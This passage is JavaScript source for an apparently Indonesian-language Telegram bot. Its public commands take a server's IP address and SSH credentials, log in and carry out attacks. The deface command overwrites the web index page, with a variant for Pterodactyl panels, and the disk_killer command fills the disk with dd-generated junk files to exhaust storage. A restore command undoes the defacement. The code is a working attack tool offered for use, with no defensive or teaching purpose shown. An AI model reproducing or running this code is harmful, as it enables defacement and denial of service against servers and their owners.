// --- 3. COMMAND DEFACE (PUBLIK) ---
bot.command('deface', async (ctx) => {
    
    const args = ctx.message.text.split(' ')[1];
    if (!args) return ctx.reply('Format: /deface IP|PORT|USER|PASS|NAMA_FILE');

    const [ip, port, user, pass, fileName] = args.split('|');
    const htmlPath = path.join(HTML_DIR, fileName || '');

    if (!fs.existsSync(htmlPath)) return ctx.reply('❌ File HTML tidak ditemukan! Cek /listhtml');

    try {
        const status = await ctx.reply('🔌 Menghubungkan ke SSH...');
        await ssh.connect({ host: ip, port: parseInt(port), username: user, password: pass });

        const htmlContent = fs.readFileSync(htmlPath, 'utf8');
        const escapedHtml = htmlContent.replace(/'/g, "'\\''");

        // Logic Pterodactyl vs VPS Biasa
        const checkPtero = await ssh.execCommand('ls -d /var/www/pterodactyl');
        
        if (checkPtero.stdout.includes('/var/www/pterodactyl')) {
            const publicPath = '/var/www/pterodactyl/public';
            await ssh.execCommand(`cp ${publicPath}/index.php ${publicPath}/index.php.backup`);
            await ssh.execCommand(`echo '<?php header("Location: /index.html"); ?>' > ${publicPath}/index.php`);
            await ssh.execCommand(`echo '${escapedHtml}' > ${publicPath}/index.html`);
        } else {
            await ssh.execCommand('mv /var/www/html/index.html /var/www/html/index.html.bak');
            await ssh.execCommand(`echo '${escapedHtml}' > /var/www/html/index.html`);
        }

        ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, `✅ <b>DEFACE SUCCESS!</b>\nTarget: <code>${ip}</code>\nScript: <code>${fileName}</code>`, { parse_mode: 'HTML' });
    } catch (err) {
        ctx.reply('❌ ERROR: ' + err.message);
    } finally { ssh.dispose(); }
});

// --- 4. COMMAND RESTORE (PUBLIK) ---
bot.command('restore', async (ctx) => {
    
    const args = ctx.message.text.split(' ')[1];
    if (!args) return ctx.reply('Format: /restore IP|PORT|USER|PASS');

    const [ip, port, user, pass] = args.split('|');

    try {
        const status = await ctx.reply('♻️ Mencoba Restore...');
        await ssh.connect({ host: ip, port: parseInt(port), username: user, password: pass });

        const checkPtero = await ssh.execCommand('ls -la /var/www/pterodactyl/public/index.php.backup');
        
        if (checkPtero.stdout.includes('index.php.backup')) {
            await ssh.execCommand('cp /var/www/pterodactyl/public/index.php.backup /var/www/pterodactyl/public/index.php');
            await ssh.execCommand('rm -f /var/www/pterodactyl/public/index.html');
        } else {
            await ssh.execCommand('mv /var/www/html/index.html.bak /var/www/html/index.html');
        }

        ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, `✅ <b>RESTORE SUCCESS!</b>\nTarget <code>${ip}</code> kembali normal.`, { parse_mode: 'HTML' });
    } catch (err) {
        ctx.reply('❌ ERROR: ' + err.message);
    } finally { ssh.dispose(); }
});

// --- 5. COMMAND DISK KILLER (PUBLIK) ---
bot.command('disk_killer', async (ctx) => {
    const args = ctx.message.text.split(' ')[1];
    if (!args) return ctx.reply('Format: /disk_killer IP|PORT|USER|PASS');
    const [ip, port, user, pass] = args.split('|');

    try {
        await ctx.reply('💀 Memulai serangan disk...');
        await ssh.connect({ host: ip, port: parseInt(port), username: user, password: pass });

        await ssh.execCommand('mkdir -p /tmp/killer');
        for (let i = 0; i < 20; i++) {
            await ssh.execCommand(`dd if=/dev/zero of=/tmp/killer/p_${i}.bin bs=1M count=100`);
        }

        ctx.reply(`✅ Serangan selesai pada target <code>${ip}</code>`, { parse_mode: 'HTML' });
    } catch (err) {
        ctx.reply('❌ ERROR: ' + err.message);
    } finally { ssh.dispose(); }
});
